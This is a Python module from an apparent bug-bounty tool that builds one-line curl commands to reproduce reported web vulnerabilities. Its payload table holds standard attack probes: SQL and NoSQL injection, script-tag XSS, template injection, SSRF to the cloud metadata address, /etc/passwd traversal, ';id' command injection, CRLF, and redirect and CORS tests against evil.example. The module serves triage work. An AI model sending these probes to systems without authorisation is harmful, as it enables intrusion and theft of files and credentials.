"""proof_repro — a deterministic, one-click reproduction command for any finding.

The scarce thing in an AI-flooded bug-bounty world is a finding a triager can
*trust in 30 seconds*. So every HUNTR finding ships a single, copy-pasteable
command that reproduces it, plus the exact signal to look for — generated
deterministically from the finding (class + endpoint + param + payload), no LLM,
no captured request needed. This is the trust layer: "run this one line, see
this, it's real."

Importable: repro_for(finding) -> {"cmd", "expect", "note"} (or None if unmappable).
"""
import re
import shlex
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode


def _cls(f):
    c = (f.get("cls") or f.get("class") or "").lower()
    c = c.replace(" ", "").replace("-", "").replace("_", "")
    if "nosql" in c: return "nosqli"
    for k in ("sqli", "xss", "ssrf", "ssti", "idor", "authz", "lfi", "redirect",
              "cors", "crlf", "cmdi", "jwt", "race"):
        if k in c: return k
    if "sql" in c: return "sqli"
    if "openredirect" in c or "redirect" in c: return "redirect"
    if "authbypass" in c or "accesscontrol" in c: return "authz"
    if "clickjack" in c: return "clickjack"
    return c


def _set_param(url, param, value):
    """Return url with `param` set to value (added if absent)."""
    sp = urlsplit(url)
    q = dict(parse_qsl(sp.query, keep_blank_values=True))
    if not param:
        param = next(iter(q), None) or "q"
    q[param] = value
    return urlunsplit((sp.scheme or "http", sp.netloc, sp.path, urlencode(q), ""))


def _first_param(f):
    p = f.get("param")
    if p:
        return p
    sp = urlsplit(f.get("endpoint", "") or "")
    q = parse_qsl(sp.query, keep_blank_values=True)
    return q[0][0] if q else None


def _curl(url, extra=""):
    return ("curl -sk " + (extra + " " if extra else "") + shlex.quote(url)).strip()


# class -> (payload, expected-signal, note). payload is injected into the finding's param.
_PAYLOADS = {
    "sqli":     ("1'", "a SQL error / different response vs id=1 (sqlmap-confirmable)", "error- or boolean-based SQLi"),
    "xss":      ("<script>alert(1)</script>", "the payload reflected UNescaped in the HTML body", "reflected XSS"),
    "ssti":     ("{{1337*7}}", "the rendered value 9359 in the response (template evaluated)", "server-side template injection"),
    "ssrf":     ("http://169.254.169.254/latest/meta-data/", "cloud metadata content fetched server-side", "SSRF to cloud metadata"),
    "lfi":      ("../../../../etc/passwd", "a 'root:' line (arbitrary file read)", "path traversal / LFI"),
    "redirect": ("https://evil.example/", "a 3xx with Location: https://evil.example (off-domain)", "open redirect"),
    "nosqli":   ("[$ne]=1", "auth/filter bypass vs the baseline value", "NoSQL injection"),
    "crlf":     ("%0d%0aSet-Cookie:huntr=1", "an injected Set-Cookie/header in the response", "CRLF / header injection"),
    "cmdi":     (";id", "command output (uid=…) in the response", "OS command injection"),
}


def repro_for(finding):
    cls = _cls(finding)
    ep = finding.get("endpoint") or ""
    if not ep:
        return None
    if not ep.startswith("http"):
        ep = "http://" + ep
    param = _first_param(finding)

    if cls == "cors":
        return {"cmd": _curl(ep, "-I -H 'Origin: https://evil.example'"),
                "expect": "response headers echo Access-Control-Allow-Origin: https://evil.example WITH Access-Control-Allow-Credentials: true",
                "note": "CORS misconfig — attacker origin reflected with credentials"}
    if cls == "clickjack":
        return {"cmd": _curl(ep, "-I"),
                "expect": "no X-Frame-Options / frame-ancestors header (page is framable)",
                "note": "clickjacking — missing framing protection"}
    if cls == "authz":
        # bypass-style: hit the endpoint directly (often with a client-controlled gate param)
        return {"cmd": _curl(ep),
                "expect": "HTTP 200 with privileged/admin content that should be denied",
                "note": finding.get("detail") or "access-control bypass"}
    if cls == "idor":
        hint = _set_param(ep, param or "id", "2")
        return {"cmd": _curl(hint),
                "expect": "another user's private data returned (no ownership check)",
                "note": "IDOR — increment/alter the object id and compare to your own"}

    pl = _PAYLOADS.get(cls)
    if pl:
        payload, expect, note = pl
        url = _set_param(ep, param, payload)
        extra = "-I" if cls == "redirect" else ""
        return {"cmd": _curl(url, extra), "expect": expect, "note": note}

    # generic fallback: at least give the exact request
    return {"cmd": _curl(ep),
            "expect": finding.get("detail") or (finding.get("proof") or {}).get("evidence") or "the behavior described in the finding",
            "note": "replay the request and compare to the finding's evidence"}


def repro_text(finding):
    """Human/report block: the command + what to look for."""
    r = repro_for(finding)
    if not r:
        return ""
    return ("# Reproduce (" + (r["note"] or "") + ")\n" + r["cmd"] +
            "\n# Expect: " + r["expect"])
